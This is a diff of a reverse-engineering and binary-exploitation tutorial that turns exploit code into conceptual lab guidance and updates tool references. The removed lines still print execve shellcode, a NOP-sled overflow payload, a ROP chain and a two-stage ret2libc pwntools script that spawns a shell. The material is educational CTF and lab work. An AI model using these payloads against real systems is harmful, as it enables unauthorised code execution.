 
-```bash
+```text
 # IDA Pro: Identify anti-debug check, patch to NOP
 # Example: Patch "call IsDebuggerPresent" to "xor eax, eax"
 
@@ -1898,44 +1927,30 @@ int main(int argc, char **argv) {
 }
 ```
 
-**Exploitation:**
+**Lab build (x86-64, deliberately unhardened, own VM only):** `gcc -O0 -g -fno-stack-protector -no-pie -o vulnerable vulnerable.c`. Run with `setarch -R ./vulnerable …` to disable ASLR for that one process. Distro defaults add the mitigations back (Ubuntu 24.04's GCC 13.3 gives canary, PIE, Full RELRO and CET property notes by default), so confirm the build with `pwn checksec` before you start.
 
-```python
-# Generate payload to overwrite return address
-import struct
+**Finding the offset to the saved return address:**
 
-# Step 1: Find offset to return address
-# Use pattern_create (pwntools or msf-pattern_create)
-# python3 -c 'from pwn import *; print(cyclic(200))'
+```bash
+# 1. Generate a cyclic pattern. The pwntools CLI prints raw bytes; in Python 3,
+#    print(cyclic(200)) writes the b'...' repr and shifts every offset by 2.
+pwn cyclic 200
 
-# Step 2: Run program with pattern, crash at EIP=0x61616171
-# Use pattern_offset to find offset:
-# python3 -c 'from pwn import *; print(cyclic_find(0x61616171))'
-# Offset: 76 bytes
+# 2. Run under GDB with the pattern as argv[1]. On x86-64 the smashed return address
+#    is non-canonical, so the CPU faults AT the ret instruction and RIP never holds
+#    the pattern. Read the saved-return-address slot at [rsp] instead:
+gdb -q --args ./vulnerable "$(pwn cyclic 200)"
+#   (gdb) run
+#   => 0x401196 <vulnerable_function+64>:  ret
+#   (gdb) x/gx $rsp
+#   0x7fffffffd1c8: 0x6161617461616173      ("saaataaa")
 
-# Step 3: Craft payload
-offset = 76
-return_address = struct.pack("<I", 0x08048484)  # Address of shellcode or gadget
-nop_sled = b"\x90" * 16  # NOP sled
-shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68..."  # Shellcode (spawn shell)
-
-payload = b"A" * offset + return_address + nop_sled + shellcode
-
-# Run:
-# ./vulnerable "$(python3 exploit.py)"
+# 3. Look up the lower 4 bytes with the same tool that generated the pattern:
+pwn cyclic -l 0x61616173
+# 72   (64-byte buffer + 8-byte saved RBP)
 ```
 
-**Stack layout during overflow:**
-
-```
-High memory
------------------
-[Return address]   <-- Overwrite with shellcode address
-[Saved EBP]        <-- Overwritten
-[buffer[64]]       <-- Buffer overflow starts here
-...
-Low memory
-```
+On Kali, Metasploit's `msf-pattern_create -l 200` / `msf-pattern_offset -q <value>` do the same job with a different `Aa0Aa1…` pattern; always look the value up with the tool that generated it. With this build, bytes 64-71 of the input overwrite the saved RBP and bytes 72-79 the saved return address that `ret` pops (see [Stack Frames](#stack-frames)); what can be done with that control depends on the mitigations below.
 
 ### Return-Oriented Programming (ROP)
 
@@ -1943,14 +1958,14 @@ Low memory
 
 **Why ROP?**
 - **DEP/NX:** Data Execution Prevention prevents executing code on stack/heap
-- **ASLR:** Address Space Layout Randomization makes hardcoded addresses unreliable
-- **ROP bypasses DEP:** Uses existing code in binary/libraries (already executable)
+- **ROP defeats DEP/NX:** it reuses code that is already executable in the binary or its libraries
+- **ROP does not defeat ASLR/PIE on its own:** gadget addresses must come from a non-PIE image or an information leak
 
 **Finding ROP gadgets:**
 
 ```bash
 # ROPgadget (Python tool):
-ROPgadget --binary vulnerable --ropchain
+ROPgadget --binary vulnerable
 
 # Or use ropper:
 ropper --file vulnerable --search "pop rdi"
@@ -1962,80 +1977,7 @@ ropper --file vulnerable --search "pop rdi"
 0x00400610: syscall; ret
 ```
 
-**ROP chain example (call execve("/bin/sh")):**
-
-```python
-from pwn import *
-
-# Gadgets:
-pop_rdi = 0x004005a3  # pop rdi; ret
-pop_rsi_r15 = 0x004005a1  # pop rsi; pop r15; ret
-pop_rax = 0x00400490  # pop rax; ret
-syscall = 0x00400610  # syscall; ret
-
-# Data:
-bin_sh = 0x00601050  # Address of "/bin/sh" string in binary
-
-# ROP chain to call execve("/bin/sh", NULL, NULL):
-# execve(rdi="/bin/sh", rsi=NULL, rdx=NULL) -> syscall 59
-
-rop_chain = p64(pop_rdi) + p64(bin_sh)       # rdi = "/bin/sh"
-rop_chain += p64(pop_rsi_r15) + p64(0) + p64(0)  # rsi = NULL, r15 = 0
-rop_chain += p64(pop_rax) + p64(59)          # rax = 59 (execve syscall)
-rop_chain += p64(syscall)                    # syscall
-
-# Full payload:
-payload = b"A" * 76 + rop_chain
-
-# Send to vulnerable program
-```
-
-### Shellcode Development
-
-**Shellcode** is position-independent code (typically for spawning a shell).
-
-**Linux x64 shellcode (execve("/bin/sh")):**
-
-```nasm
-; execve("/bin/sh", NULL, NULL)
-; syscall number: 59 (in RAX)
-
-section .text
-global _start
-
-_start:
-    xor rax, rax        ; RAX = 0
-    push rax            ; NULL terminator
-    mov rdi, 0x68732f6e69622f  ; "/bin/sh" (little-endian)
-    push rdi            ; Push "/bin/sh" onto stack
-    mov rdi, rsp        ; RDI = pointer to "/bin/sh"
-    xor rsi, rsi        ; RSI = NULL (argv)
-    xor rdx, rdx        ; RDX = NULL (envp)
-    mov al, 59          ; RAX = 59 (execve syscall)
-    syscall             ; Execute syscall
-```
-
-**Assemble shellcode:**
-
-```bash
-# Assemble:
-nasm -f elf64 shellcode.asm -o shellcode.o
-ld shellcode.o -o shellcode
-
-# Extract bytes:
-objdump -d shellcode -M intel | grep '^ ' | cut -f2 | tr -d ' \n'
-# Output: 4831c05048bf2f62696e2f736800574889e74831f64831d2b03b0f05
-```
-
-**Python shellcode payload:**
-
-```python
-shellcode = b"\x48\x31\xc0\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x00"
-shellcode += b"\x57\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb0\x3b\x0f\x05"
-
-# Use in exploit:
-payload = nop_sled + shellcode + return_address
-```
+**Reading a chain:** a ROP chain is a sequence of gadget addresses and values laid out from the saved-return-address slot upward; each `ret` pops the next address. On x86-64 System V the first arguments travel in `rdi`, `rsi`, `rdx`, and every user-space address packed as 8 bytes contains NUL bytes, so a `strcpy`-style bug cannot deliver a chain that a `read`/`gets` bug can.
 
 ### Bypassing Protections
 
@@ -2048,34 +1990,61 @@ payload = nop_sled + shellcode + return_address
 - **Bypass:** Information leak (leak address, calculate offsets)
 
 **Stack Canaries:**
-- **What it does:** Places random value before return address, checks on function return
-- **Detection:**
+- **What it does:** Places random value before return address, checks on function return. On glibc (little-endian) the canary's lowest byte is always `0x00`.
+- **Detection (GCC 13, x86-64):**
 ```nasm
 mov rax, qword ptr fs:[0x28]  ; Load canary from TLS
 mov qword ptr [rbp-0x8], rax  ; Store canary on stack
 ; ... function body ...
 mov rax, qword ptr [rbp-0x8]  ; Load canary from stack
-xor rax, qword ptr fs:[0x28]  ; Compare with original
-jne __stack_chk_fail          ; Crash if mismatch
+sub rax, qword ptr fs:[0x28]  ; Compare with original
+je  .return                   ; Equal: normal epilogue
+call __stack_chk_fail         ; Mismatch: abort
 ```
-- **Bypass:** Leak canary value (via format string or info leak)
+- **Bypass:** Leak the canary (format string or other info leak). A `fork()`-per-connection server hands every child the parent's canary, so it can be recovered byte by byte; a freshly `execve`d process gets a new one.
 
 **PIE (Position Independent Executable):**
 - **What it does:** Binary can be loaded at any address (extends ASLR to code section)
 - **Bypass:** Information leak (leak code address, calculate gadget offsets)
 
+**RELRO (Relocation Read-Only):**
+- **What it does:** `ld -z relro` emits a `PT_GNU_RELRO` segment that is made read-only after relocation. **Full RELRO** adds `-z now` (resolve every symbol at startup), so the GOT no longer has to stay writable for lazy binding; **Partial RELRO** keeps lazy binding and a writable `.got.plt`.
+- **Impact:** GOT-overwrite techniques need Partial or No RELRO.
+
+**FORTIFY_SOURCE:**
+- **What it does:** `-D_FORTIFY_SOURCE=1|2|3` makes glibc route calls such as `strcpy`/`memcpy`/`printf` to checked `__*_chk` variants that terminate the program with `SIGABRT` when a check fails. Levels 1-2 use `__builtin_object_size`; level 3 uses `__builtin_dynamic_object_size` and needs glibc 2.35+ with GCC 12+ (glibc 2.33+ with LLVM 9+).
+- **Spot it:** `__strcpy_chk`, `__memcpy_chk`, `__printf_chk` imports.
+
+**CET (Control-flow Enforcement Technology, x86-64):**
+- **What it does:** The hardware shadow stack (SHSTK) keeps a protected copy of return addresses and faults on a `ret` whose address does not match; indirect branch tracking (IBT) requires indirect-branch targets to begin with `endbr64`.
+- **Linux status:** the kernel supports only user-space shadow stack and kernel IBT (no user-space IBT). glibc 2.39 syncs with the Linux 6.6 shadow-stack interface; the `glibc.cpu.x86_shstk` tunable (`on`/`off`/`permissive`) controls it. `checksec` reporting `SHSTK`/`IBT: Enabled` reflects the ELF property note, not runtime enforcement.
+- **Windows:** the `/CETCOMPAT` linker flag marks an x64 image as CET shadow-stack compatible.
+
+**CFG (Control Flow Guard, Windows):**
+- **What it does:** `/guard:cf` (compiler and linker; `/DYNAMICBASE` is also required) inserts a check before every indirect call, and a CFG-aware OS (Windows 10/11, Windows Server 2019+) terminates the process if the target is not a valid call target.
+- **Spot it:** `dumpbin /headers /loadconfig` shows `Guard` in the DLL characteristics and `CF Instrumented` in the guard flags.
+
 **Checking protections:**
 
 ```bash
-# Linux: checksec (pwntools):
-checksec --file vulnerable
-# Output:
-# RELRO: Partial RELRO
-# Stack: No canary found
-# NX: NX enabled
-# PIE: No PIE
+# Linux: two different tools are both called checksec.
+pwn checksec ./vulnerable        # pwntools
+checksec file ./vulnerable       # slimm609/checksec v3 (Go rewrite)
+# pwn checksec output for the lab build above (pwntools 4.15, GCC 13.3):
+#     Arch:       amd64-64-little
+#     RELRO:      Partial RELRO
+#     Stack:      No canary found
+#     NX:         NX enabled
+#     PIE:        No PIE (0x400000)
+#     SHSTK:      Enabled
+#     IBT:        Enabled
+#     Stripped:   No
+#     Debuginfo:  Yes
+```
 
+```powershell
 # Windows: PESecurity (PowerShell):
+Import-Module .\Get-PESecurity.psm1
 Get-PESecurity -file vulnerable.exe
 ```
 
@@ -2134,6 +2103,8 @@ int main(void) {
 ### Patching Binaries
 
 **Scenario:** Patch a license check to always return "valid."
+
+> **Scope:** crackmes, CTF binaries, or software you hold the rights to. Bypassing licence checks on third-party commercial software is circumvention of a technological protection measure; see [[../../Investigations/Techniques/sop-legal-ethics|Legal & Ethics]].
 
 **Workflow:**
 
@@ -2213,7 +2184,7 @@ strings malware.exe | grep -E "([0-9]{1,3}\.){3}[0-9]{1,3}|https?://"
 
 **1. Download binary and check protections:**
 ```bash
-checksec chall
+pwn checksec ./chall
 # Output: NX enabled, No PIE, No canary
 ```
 
@@ -2229,58 +2200,27 @@ void vuln() {
 
 **3. Find offset to return address:**
 ```bash
-# Generate cyclic pattern:
-python3 -c 'from pwn import *; print(cyclic(200))' > pattern.txt
+# Generate cyclic pattern (raw bytes; print(cyclic(200)) in Python 3 writes the b'...' repr):
+pwn cyclic 200 > pattern.txt
 
-# Run in GDB:
-gdb ./chall
-run < pattern.txt
-# Crash at RIP = 0x6161616b ("kaaa")
+# Run in GDB. On x86-64 the fault is AT the ret instruction, so read the
+# saved-return-address slot, not RIP:
+gdb -q ./chall
+#   (gdb) run < pattern.txt
+#   (gdb) x/gx $rsp
+#   0x7ffe...: 0x6161617461616173   ("saaataaa")
 
-# Find offset:
-python3 -c 'from pwn import *; print(cyclic_find(0x6161616b))'
-# Offset: 72
+# Find offset (lower 4 bytes of that qword):
+pwn cyclic -l 0x61616173
+# 72
 ```
 
-**4. Develop exploit (ret2libc to bypass NX):**
-```python
-from pwn import *
+**4. Plan the ret2libc stages (NX on, no PIE):**
+- **Stage 1, leak:** pass a GOT entry (e.g. `puts@got`) to `puts@plt` through a `pop rdi; ret` gadget, then return to `main` for a second input. `vuln()` echoes the buffer first, so read past that line before parsing the leaked pointer.
+- **Resolve libc from the challenge's own `libc.so.6`:** base = leaked `puts` minus `puts`'s symbol offset in that file (pwntools `ELF` symbols), never offsets copied from another distro's libc.
+- **Stage 2:** call the target libc function with one extra `ret` gadget first, so that on entry to the libc function `rsp + 8` is a multiple of 16, as the x86-64 System V psABI requires. [verify 2026-10-31]
 
-# Addresses:
-puts_plt = 0x400530      # puts@PLT
-puts_got = 0x601018      # puts@GOT
-pop_rdi = 0x4006d3       # pop rdi; ret gadget
-ret = 0x4006d4           # ret gadget (for alignment)
-main = 0x400626          # main function
-
-# Stage 1: Leak libc address
-payload = b"A" * 72
-payload += p64(pop_rdi) + p64(puts_got)  # rdi = puts@GOT
-payload += p64(puts_plt)                 # Call puts(puts@GOT) -> leak libc
-payload += p64(main)                     # Return to main
-
-p = process('./chall')
-p.sendline(payload)
-leak = u64(p.recvline().strip().ljust(8, b'\x00'))
-libc_base = leak - 0x809c0  # Offset to puts in libc
-system = libc_base + 0x4f440
-bin_sh = libc_base + 0x1b3e9a
-
-# Stage 2: Call system("/bin/sh")
-payload2 = b"A" * 72
-payload2 += p64(ret)  # Stack alignment
-payload2 += p64(pop_rdi) + p64(bin_sh)
-payload2 += p64(system)
-
-p.sendline(payload2)
-p.interactive()  # Shell!
-```
-
-**5. Submit flag:**
-```bash
-# In shell:
-cat flag.txt
-```
+**5. Submit flag:** record the offset, gadget addresses and the libc build (hash) in the write-up.
 
 ---
 
@@ -2291,12 +2231,12 @@ cat flag.txt
 | Tool | Type | Platform | Cost | Download |
 |------|------|----------|------|----------|
 | **IDA Pro** | Disassembler + Decompiler | Win/Linux/macOS | $$$ | https://hex-rays.com/ida-pro/ |
-| **Ghidra** | Disassembler + Decompiler | Win/Linux/macOS | Free | https://ghidra-sre.org/ |
+| **Ghidra** | Disassembler + Decompiler | Win/Linux/macOS | Free | https://github.com/NationalSecurityAgency/ghidra |
 | **Binary Ninja** | Disassembler + Decompiler | Win/Linux/macOS | $$ | https://binary.ninja/ |
 | **Radare2** | Disassembler | Win/Linux/macOS | Free | https://rada.re/ |
-| **Cutter** | Disassembler (r2 GUI) | Win/Linux/macOS | Free | https://cutter.re/ |
+| **Cutter** | Disassembler + Decompiler (Rizin GUI) [verify 2026-10-31] | Win/Linux/macOS | Free | https://cutter.re/ |
 | **Hopper** | Disassembler + Decompiler | macOS/Linux | $ | https://www.hopperapp.com/ |
-| **RetDec** | Decompiler (online/CLI) | Web/Linux | Free | https://retdec.com/ |
+| **RetDec** | Decompiler (CLI; limited maintenance, last release v5.0 in 2022) | Win/Linux/macOS | Free | https://github.com/avast/retdec |
 
 ### Debuggers
 
@@ -2304,7 +2244,7 @@ cat flag.txt
 |------|----------|----------|
 | **x64dbg** | Windows | Windows user-mode, malware, CTF |
 | **WinDbg** | Windows | Kernel debugging, crash analysis |
-| **GDB** | Linux/macOS | Linux/macOS debugging, exploits, Python scripting (PEDA/GEF/pwndbg) |
+| **GDB** | Linux/macOS | Linux/macOS debugging, exploits, Python scripting (GEF/pwndbg) |
 | **LLDB** | macOS/Linux | macOS/iOS, modern alternative to GDB |
 | **OllyDbg** | Windows | Legacy 32-bit (x64dbg recommended) |
 | **IDA Debugger** | Win/Linux/macOS | Integrated with IDA disassembly |
@@ -2341,7 +2281,7 @@ cat flag.txt
 - **dnSpyEx:** Decompiler + debugger (active community fork — original dnSpy archived 2020-12-21)
 - **ILSpy:** Decompiler (cross-platform GUI via Avalonia, plus `ilspycmd`)
 - **dotPeek:** Decompiler (JetBrains)
-- **de4dot:** Deobfuscator (legacy; some obfuscators not covered)
+- **de4dot:** Deobfuscator (archived 2020; no updates for newer obfuscators)
 
 **Android:**
 - **JADX:** DEX to Java decompiler
@@ -2357,9 +2297,7 @@ cat flag.txt
 | **pwntools** | Python exploit framework |
 | **ROPgadget** | ROP gadget finder |
 | **ropper** | ROP gadget finder (more features) |
-| **msfvenom** | Shellcode generator (Metasploit) |
-| **one_gadget** | Find one-shot RCE gadgets in libc |
-| **pwndbg/GEF/PEDA** | GDB enhancements for exploit dev |
+| **pwndbg / GEF** | GDB enhancements for exploit dev (pwndbg also supports LLDB) |
 
 ### Utilities
 
@@ -2367,33 +2305,32 @@ cat flag.txt
 |------|---------|
 | **HxD** | Hex editor (Windows) |
 | **010 Editor** | Hex editor with templates |
-| **Detect It Easy (DiE)** | Packer/compiler detection (300+ signatures, per-section entropy) |
-| **Entropy** | Measure file entropy (detect packing) |
+| **Detect It Easy (DiE)** | Packer/compiler detection (signature database plus file and per-section entropy) |
 | **UPX** | Packer/unpacker |
 | **PEiD** | Packer/compiler detection (legacy but useful for older signatures) |
 | **pe-sieve / hollows_hunter** | Memory-scan unpacker — dump injected/hollowed/unpacked PE images from a live process |
 | **ScyllaHide** | Plugin for x64dbg/OllyDbg/IDA — patches PEB, NtQueryInformationProcess, hardware-breakpoint, and timing checks transparently |
-| **TitanHide** | Kernel driver counterpart to ScyllaHide — defeats malware that issues direct syscalls to bypass user-mode hooks |
-| **al-khaser** | Open-source 170+ check matrix for VM/debugger/sandbox detection — validate your hardened analysis VM before detonating evasive samples |
-| **pafish** | Lightweight VM/sandbox detection tester — fast pre-analysis sanity check (green = artifact hidden, red = artifact still leaks) |
-| **Binary Refinery** | Python-based binary analysis toolkit with 100+ tools for data extraction, deobfuscation, and format parsing |
+| **TitanHide** | Kernel driver counterpart to ScyllaHide — defeats malware that issues direct syscalls to bypass user-mode hooks. Requires PatchGuard and driver signature enforcement (DSE) disabled: dedicated analysis VM only (`github.com/mrexodia/TitanHide`) |
+| **al-khaser** | Open-source check matrix for VM/debugger/sandbox detection (`github.com/ayoubfaouzi/al-khaser`) — validate your hardened analysis VM before detonating evasive samples |
+| **pafish** | Lightweight VM/sandbox detection tester (green = artifact hidden, red = artifact still leaks). Archived; last commit 2021, so its checks are frozen: prefer al-khaser for current coverage |
+| **Binary Refinery** | Python-based binary analysis toolkit with hundreds of units for data extraction, deobfuscation, and format parsing |
 
 **Binary Refinery usage:**
 ```bash
 # Install Binary Refinery:
 pip install binary-refinery
 
-# Extract strings from binary:
-emit malware.exe | carve string | peek
+# Extract printable strings (6+ chars) from binary:
+emit malware.exe | carve -n 6 printable | peek
 
 # Decode XOR-encoded data:
-emit encoded.bin | xor key:0x42 | peek
+emit encoded.bin | xor 0x42 | peek
 
-# Extract embedded PE files:
-emit packed.exe | carve pe | dump
+# Extract embedded PE files (dump writes one file per chunk; with no file name it goes to the clipboard) [verify 2026-10-31]:
+emit packed.exe | carve-pe | dump 'pe_{index}.{ext}'
 
 # Chain multiple operations:
-emit data.bin | xor key:0x13 | zl | carve url | peek
+emit data.bin | xor 0x13 | zl | xtp url | peek
 ```
 
 ---
@@ -2403,10 +2340,10 @@ emit data.bin | xor key:0x13 | zl | carve url | peek
 ### Books
 
 - **Practical Reverse Engineering** by Bruce Dang et al. (x86/x64/ARM reversing)
-- **The IDA Pro Book** by Chris Eagle (IDA Pro deep dive)
+- **The IDA Pro Book** by Chris Eagle (2nd ed., No Starch, July 2011 — IDA Pro deep dive; older IDA UI and API)
 - **Reversing: Secrets of Reverse Engineering** by Eldad Eilam (fundamentals)
 - **The Art of Software Security Assessment** by Mark Dowd et al. (vulnerability research)
-- **Hacking: The Art of Exploitation** by Jon Erickson (exploit development)
+- **Hacking: The Art of Exploitation** by Jon Erickson (2nd ed., No Starch, February 2008 — exploit development; predates today's default Linux hardening)
 
 ### Practice Platforms
 
@@ -2414,30 +2351,33 @@ emit data.bin | xor key:0x13 | zl | carve url | peek
 - **ReverseEngineering.StackExchange:** https://reverseengineering.stackexchange.com/
 - **CTFtime:** https://ctftime.org/ (CTF competitions with RE challenges)
 - **PicoCTF:** https://picoctf.org/ (beginner-friendly CTF)
-- **HackTheBox:** https://www.hackthebox.eu/ (reversing & exploitation)
-- **Pwnable.kr / Pwnable.tw:** (binary exploitation practice)
+- **HackTheBox:** https://www.hackthebox.com/ (reversing & exploitation)
+- **Pwnable.kr / Pwnable.tw:** https://pwnable.kr/ / https://pwnable.tw/ (binary exploitation wargames)
 
 ### Online Courses
 
-- **Malware Analysis Bootcamp (SANS FOR610)**
-- **Reverse Engineering Malware (SANS FOR610)**
+- **SANS FOR610: Reverse-Engineering Malware: Malware Analysis in the Age of AI**
+- **SANS FOR710: Reverse-Engineering Malware: Advanced Code Analysis**
 - **Practical Malware Analysis & Triage (PMAT)** by TCM Security
-- **LiveOverflow YouTube:** https://www.youtube.com/c/LiveOverflow (binary exploitation)
+- **RPISEC Modern Binary Exploitation (MBE)** - [github.com/RPISEC/MBE](https://github.com/RPISEC/MBE) (Spring 2015 course; lab setup targets 32-bit Ubuntu 14.04)
+- **LiveOverflow YouTube:** https://www.youtube.com/@LiveOverflow (binary exploitation and RE videos)
 
 ---
 
 ## Reference Resources
 
 ### Comprehensive Knowledge Bases
-- **HackTricks - Binary Exploitation** - [book.hacktricks.xyz/binary-exploitation](https://book.hacktricks.xyz/binary-exploitation)
+- **HackTricks - Binary Exploitation** - [hacktricks.wiki/en/binary-exploitation](https://hacktricks.wiki/en/binary-exploitation/basic-stack-binary-exploitation-methodology/index.html)
   - Stack/heap overflows, ROP, format strings
   - Linux and Windows exploit techniques
 - **Nightmare (Binary Exploitation)** - [guyinatuxedo.github.io](https://guyinatuxedo.github.io/)
   - Comprehensive CTF binary exploitation course
-  - Covers stack overflows, ROP, heap exploitation, kernel exploitation
+  - Covers stack overflows, ROP, format strings, heap (glibc) exploitation
 - **Reverse Engineering for Beginners** - [beginners.re](https://beginners.re/)
   - Free book by Dennis Yurichev
   - Covers x86/ARM assembly, disassembly, patterns
+- **Awesome Reverse Engineering** - [github.com/wtsxDev/reverse-engineering](https://github.com/wtsxDev/reverse-engineering)
+  - General RE resource list (last updated 2023)
 - **Malware Unicorn's Reverse Engineering 101** - [malwareunicorn.org/workshops/re101.html](https://malwareunicorn.org/workshops/re101.html)
   - Beginner-friendly RE workshop materials
   - x86 assembly, IDA Pro, malware analysis
@@ -2453,10 +2393,10 @@ emit data.bin | xor key:0x13 | zl | carve url | peek
   - x86 assembly optimization and microarchitecture guides
 
 ### Tool Documentation
-- **Ghidra Documentation** - [ghidra-sre.org](https://ghidra-sre.org/)
-  - Official Ghidra user guide and scripting reference
+- **Ghidra Documentation** - [github.com/NationalSecurityAgency/ghidra](https://github.com/NationalSecurityAgency/ghidra)
+  - Official repository (ghidra-sre.org redirects here); guides and course material under `GhidraDocs/`
   - P-Code (Ghidra's intermediate language) documentation
-- **IDA Pro Documentation** - [hex-rays.com/documentation](https://hex-rays.com/documentation/)
+- **IDA Pro Documentation** - [docs.hex-rays.com](https://docs.hex-rays.com/)
   - IDA Pro and Hex-Rays decompiler manuals
   - IDAPython API reference
 - **Binary Ninja Documentation** - [docs.binary.ninja](https://docs.binary.ninja/)
@@ -2467,12 +2407,14 @@ emit data.bin | xor key:0x13 | zl | carve url | peek
   - x64dbg debugger reference
 
 ### Binary Formats
-- **Portable Executable (PE) Format** - [docs.microsoft.com/en-us/windows/win32/debug/pe-format](https://docs.microsoft.com/en-us/windows/win32/debug/pe-format)
+- **Portable Executable (PE) Format** - [learn.microsoft.com/en-us/windows/win32/debug/pe-format](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)
   - Official Microsoft PE format specification
 - **ELF Format Specification** - [refspecs.linuxbase.org/elf/elf.pdf](https://refspecs.linuxbase.org/elf/elf.pdf)
-  - Official ELF (Linux/Unix) format specification
+  - Generic ELF (TIS 1.2) format specification
+- **x86-64 System V psABI** - [gitlab.com/x86-psABIs/x86-64-ABI](https://gitlab.com/x86-psABIs/x86-64-ABI)
+  - x86-64 ELF processor supplement (calling convention, relocations)
 - **Mach-O Format (macOS)** - [github.com/aidansteele/osx-abi-macho-file-format-reference](https://github.com/aidansteele/osx-abi-macho-file-format-reference)
-  - Apple Mach-O executable format reference
+  - Unofficial mirror of Apple's OS X ABI Mach-O File Format Reference
 
 ### Exploit Development Resources
 - **Exploit Education** - [exploit.education](https://exploit.education/)
@@ -2486,15 +2428,13 @@ emit data.bin | xor key:0x13 | zl | carve url | peek
   - Covers assembly, shellcode, ROP, heap exploitation
 - **how2heap** - [github.com/shellphish/how2heap](https://github.com/shellphish/how2heap)
   - Heap exploitation techniques and examples
-- **Shellcode Database** - [shell-storm.org/shellcode](http://shell-storm.org/shellcode/)
-  - Collection of shellcode for various architectures
 
 ### Cheat Sheets & Quick References
 - **x86/x64 Opcode Reference** - [ref.x86asm.net](http://ref.x86asm.net/)
   - Quick x86 instruction reference
 - **Syscall Tables** - [syscalls.w3challs.com](https://syscalls.w3challs.com/)
   - Linux/Windows syscall numbers and arguments
-- **GTFOBins** - [gtfobins.github.io](https://gtfobins.github.io/)
+- **GTFOBins** - [gtfobins.org](https://gtfobins.org/)
   - Unix binary exploitation techniques (sudo, SUID, capabilities)
 - **LOLBAS Project** - [lolbas-project.github.io](https://lolbas-project.github.io/)
   - Living Off the Land Binaries (Windows exploitation)
@@ -2502,8 +2442,8 @@ emit data.bin | xor key:0x13 | zl | carve url | peek
   - x86/x64 calling convention reference
 
 ### Disassembly Patterns & Idioms
-- **Hex-Rays Microcode Documentation** - [hex-rays.com/products/ida/support/idapython_docs/](https://hex-rays.com/products/ida/support/idapython_docs/)
-  - Understanding Hex-Rays decompiler internals
+- **IDAPython API Reference** - [python.docs.hex-rays.com](https://python.docs.hex-rays.com/)
+  - IDA scripting API, including the Hex-Rays decompiler (`ida_hexrays`) module
 - **Binary Ninja IL Reference** - [docs.binary.ninja/dev/bnil-overview.html](https://docs.binary.ninja/dev/bnil-overview.html)
   - Understanding Binary Ninja's intermediate languages
 - **Compiler Explorer (Godbolt)** - [godbolt.org](https://godbolt.org/)
@@ -2511,43 +2451,23 @@ emit data.bin | xor key:0x13 | zl | carve url | peek
   - Understand compiler optimizations and patterns
 
 ### Anti-Reversing & Obfuscation
-- **Awesome Reverse Engineering - Anti-Debugging** - [github.com/wtsxDev/reverse-engineering](https://github.com/wtsxDev/reverse-engineering)
-  - Collection of anti-debugging techniques
-- **The Ultimate Anti-Reversing Reference** - [anti-reversing.com](http://www.anti-reversing.com/)
-  - Comprehensive anti-RE techniques catalog
 - **Unprotect Project** - [unprotect.it](https://unprotect.it/)
   - Malware evasion techniques database
-
-### Practice Platforms
-- **Crackmes.one** - [crackmes.one](https://crackmes.one/)
-  - Community crackme challenges (all difficulty levels)
-- **Reverse Engineering StackExchange** - [reverseengineering.stackexchange.com](https://reverseengineering.stackexchange.com/)
-  - Q&A forum for reverse engineering
-- **PicoCTF** - [picoctf.org](https://picoctf.org/)
-  - Beginner-friendly CTF with RE challenges
-- **Pwnable.kr** - [pwnable.kr](http://pwnable.kr/)
-  - Korean wargame with binary exploitation challenges
-- **Pwnable.tw** - [pwnable.tw](https://pwnable.tw/)
-  - Taiwan wargame with advanced exploitation challenges
-- **HackTheBox** - [hackthebox.com](https://www.hackthebox.com/)
-  - Reversing and binary exploitation boxes
 
 ### CTF Write-ups & Solutions
 - **CTFtime Write-ups** - [ctftime.org/writeups](https://ctftime.org/writeups)
   - CTF solutions database (search for RE challenges)
 - **Google CTF Write-ups** - [github.com/google/google-ctf](https://github.com/google/google-ctf)
   - Official Google CTF challenge write-ups
-- **LiveOverflow YouTube** - [youtube.com/c/LiveOverflow](https://www.youtube.com/c/LiveOverflow)
-  - Binary exploitation and RE video tutorials
 
 ### Blogs & Research
 - **Trail of Bits Blog** - [blog.trailofbits.com](https://blog.trailofbits.com/)
   - Security research and reverse engineering articles
 - **RET2 Systems Blog** - [blog.ret2.io](https://blog.ret2.io/)
   - Vulnerability research and exploit development
-- **Windows Internals Blog** - [windows-internals.com/blog](https://www.windows-internals.com/blog/)
+- **Windows Internals Blog** - [windows-internals.com](https://windows-internals.com/category/windows-internals/)
   - Windows kernel and internals research
-- **Phrack Magazine** - [phrack.org](http://phrack.org/)
+- **Phrack Magazine** - [phrack.org](https://phrack.org/)
   - Classic hacking/exploitation zine (historical techniques)
 
 ### Debugging & Dynamic Analysis
@@ -2557,27 +2477,27 @@ emit data.bin | xor key:0x13 | zl | carve url | peek
   - Intel Pin instrumentation framework
 - **GDB Cheat Sheet** - [darkdust.net/files/GDB%20Cheat%20Sheet.pdf](https://darkdust.net/files/GDB%20Cheat%20Sheet.pdf)
   - Quick GDB command reference
-- **pwndbg Documentation** - [github.com/pwndbg/pwndbg](https://github.com/pwndbg/pwndbg)
-  - GDB enhancement for exploit development
+- **pwndbg Documentation** - [pwndbg.re](https://pwndbg.re/)
+  - GDB/LLDB enhancement for exploit development
 - **GEF Documentation** - [hugsy.github.io/gef](https://hugsy.github.io/gef/)
   - GDB Enhanced Features guide
 
 ### Binary Analysis Tools
 - **Binary Refinery** - [github.com/binref/refinery](https://github.com/binref/refinery)
-  - Python-based binary analysis toolkit with 100+ tools
+  - Python-based binary analysis toolkit with hundreds of units
   - Data extraction, deobfuscation, format parsing
 - **angr Documentation** - [docs.angr.io](https://docs.angr.io/)
   - Binary analysis framework (symbolic execution, CFG recovery)
-- **Triton** - [triton.quarkslab.com](https://triton.quarkslab.com/)
+- **Triton** - [triton-library.github.io](https://triton-library.github.io/)
   - Dynamic symbolic execution framework
 - **Unicorn Engine** - [unicorn-engine.org](https://www.unicorn-engine.org/)
   - Lightweight CPU emulator for RE
 
 ### Platform-Specific Resources
 **Windows:**
-- **Windows Internals (Book Series)** by Mark Russinovich
+- **Windows Internals (Book Series)** by Pavel Yosifovich, Mark E. Russinovich, Alex Ionescu, David A. Solomon (7th ed., Part 1)
 - **Undocumented Windows Functions** - [undocumented.ntinternals.net](http://undocumented.ntinternals.net/)
-- **WinAPI Index** - [docs.microsoft.com/en-us/windows/win32/api](https://docs.microsoft.com/en-us/windows/win32/api/)
+- **WinAPI Index** - [learn.microsoft.com/en-us/windows/win32/api](https://learn.microsoft.com/en-us/windows/win32/api/)
 
 **Linux:**
 - **Linux Syscall Reference** - [man7.org/linux/man-pages/man2/syscalls.2.html](https://man7.org/linux/man-pages/man2/syscalls.2.html)
